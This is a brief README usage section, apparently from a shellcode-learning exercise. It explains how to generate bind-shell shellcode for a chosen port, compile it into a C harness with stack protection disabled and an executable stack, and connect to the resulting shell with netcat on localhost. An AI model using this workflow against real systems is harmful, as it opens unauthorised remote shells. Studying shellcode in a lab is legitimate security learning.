# Usage

1. 
2. `python3 create_bindshell_shellcode.py -p <port number>`
3. Copy shellcode, paste into shellcode.c.
4. Compile shellcode.c: `gcc -fno-stack-protector -z execstack shellcode.c -o shellcode`
5. Run shellcode: `./shellcode`
6. Connect to bindshell, in a separate terminal: `nc -nv 127.0.0.1 <port number>`
